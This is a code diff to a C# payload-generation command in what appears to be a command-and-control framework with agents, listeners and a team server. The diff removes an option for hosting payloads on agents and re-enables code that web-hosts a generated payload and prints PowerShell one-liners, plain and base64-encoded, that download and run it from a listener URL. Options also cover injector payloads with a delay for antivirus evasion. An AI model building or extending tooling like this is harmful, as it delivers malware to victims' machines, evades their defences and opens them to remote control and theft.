@@ -9,6 +9,7 @@ using Common;
 using Common.Payload;
 using Common.Models;
 using Shared;
+using Commander.Helper;
 
 namespace Commander.Commands
 {
@@ -25,7 +26,6 @@ namespace Commander.Commands
         public bool debug { get; set; }
 
         public string webhost { get; set; }
-        public string webhostAgent { get; set; }
         public string webhostListener { get; set; }
 
         public bool x86 { get; set; }
@@ -63,7 +63,6 @@ namespace Commander.Commands
             new Option<string>(new[] { "--path", "-p" }, () => null, "Folder to save the generated file"),
             new Option<string>(new[] { "--serverKey", "-k" }, () => null, "The server unique key of the endpoint"),
             new Option<string>(new[] { "--webhost", "-wh" },() => null, "Path of the file to be Web-Hosted"),
-            new Option<string>(new[] { "--webhostAgent", "-wa" },() => null, "Id ot hte Agent to Web-Host on"),
             new Option<string>(new[] { "--webhostListener", "-wl" },() => null, "Listener used to generate Web-Host script (if different fom listener)"),
             new Option(new[] { "--inject", "-i" }, "Îf the payload should be an injector"),
             new Option<int?>(new[] { "--injectDelay", "-id" },() => null, "Delay before injection (AV evasion)"),
@@ -108,30 +107,6 @@ namespace Commander.Commands
                 {
                     context.Terminal.WriteError($"[X] Listener {context.Options.listener} not found for Web-Hosting!");
                     return false;
-                }
-            }
-
-            Models.Agent agent = null;
-            if (!string.IsNullOrEmpty(context.Options.webhostAgent))
-            {
-                if (context.Options.webhostAgent == "self")
-                {
-                    if (context.Executor.CurrentAgent == null)
-                    {
-                        context.Terminal.WriteError($"[X] WebHostAgent is not valid (self should be use while interacting with an agent) !");
-                        return false;
-                    }
-                    else
-                        agent = context.Executor.CurrentAgent;
-                }
-                else
-                {
-                    agent = context.CommModule.GetAgent(context.Options.webhostAgent);
-                    if (agent == null)
-                    {
-                        context.Terminal.WriteError($"[X] WebHostAgent is not valid !");
-                        return false;
-                    }
                 }
             }
 
@@ -214,52 +189,46 @@ namespace Commander.Commands
 
 
             var ret = this.GeneratePayload(context, options);
-            if(string.IsNullOrEmpty(ret))
+            if (string.IsNullOrEmpty(ret))
             {
                 return false;
             }
 
-            //if (!string.IsNullOrEmpty(context.Options.webhost))
-            //{
-            //    byte[] fileContent = File.ReadAllBytes(ret);
-            //    var path = context.Options.webhost;
-            //    while (path.StartsWith('/'))
-            //        path = path.Substring(1);
+            if (!string.IsNullOrEmpty(context.Options.webhost))
+            {
+                byte[] fileContent = File.ReadAllBytes(ret);
+                var path = context.Options.webhost;
+                while (path.StartsWith('/'))
+                    path = path.Substring(1);
 
-            //    if (!string.IsNullOrEmpty(context.Options.webhostAgent))
-            //    {
-            //        await AgentWebHostCommand.PushFile(context, agent, context.Options.webhost, fileContent, options.Type == PayloadType.PowerShell, options.ToString());
-            //        context.Terminal.WriteSuccess($"Payload tasked to be hosted on agent at {context.Options.webhost}.");
-            //    }
-            //    else
-            //    {
-            //        await context.CommModule.WebHost(path, fileContent, options.Type == PayloadType.PowerShell, options.ToString());
 
-            //        if (options.Type == PayloadType.PowerShell)
-            //        {
-            //            if (!string.IsNullOrEmpty(context.Options.webhostListener))
-            //            {
-            //                listener = context.CommModule.GetListeners().FirstOrDefault(l => l.Name.ToLower() == context.Options.webhostListener.ToLower());
-            //            }
+                await context.CommModule.WebHost(path, fileContent, options.Type == PayloadType.PowerShell, options.ToString());
+                context.Terminal.WriteSuccess($"[*] payload hosted at {path}.");
 
-            //            var listeners = context.CommModule.GetListeners();
-            //            if (listener != null)
-            //                listeners = new List<Models.Listener>() { listener };
+                if (options.Type == PayloadType.PowerShell)
+                {
+                    if (!string.IsNullOrEmpty(context.Options.webhostListener))
+                    {
+                        listener = context.CommModule.GetListeners().FirstOrDefault(l => l.Name.ToLower() == context.Options.webhostListener.ToLower());
+                    }
 
-            //            foreach (var list in listeners)
-            //            {
-            //                string urlwh = $"{listener.EndPoint}/{path}";
-            //                context.Terminal.WriteLine($"[*] payload hosted on : {urlwh}");
+                    var listeners = context.CommModule.GetListeners();
+                    if (listener != null)
+                        listeners = new List<TeamServerListener>() { listener };
 
-            //                var script = WebHostCommand.GeneratePowershellScript(urlwh, listener.Secured);
-            //                var scriptb64 = WebHostCommand.GeneratePowershellScriptB64(urlwh, listener.Secured);
-            //                context.Terminal.WriteLine($"[>] Command : {script}");
-            //                context.Terminal.WriteLine($"[>] Command : {scriptb64}");
-            //            }
+                    foreach (var list in listeners)
+                    {
+                        string urlwh = $"{listener.EndPoint}/{path}";
+                        context.Terminal.WriteLine($"[*] payload hosted on : {urlwh}");
 
-            //        }
-            //    }
-            //}
+                        var script = PowershellHelper.GeneratePowershellScript(urlwh, listener.Secured);
+                        var scriptb64 = PowershellHelper.GeneratePowershellScriptB64(urlwh, listener.Secured);
+                        context.Terminal.WriteLine($"[>] Command : {script}");
+                        context.Terminal.WriteLine($"[>] Command : {scriptb64}");
+                    }
+
+                }
+            }
 
             return true;
         }
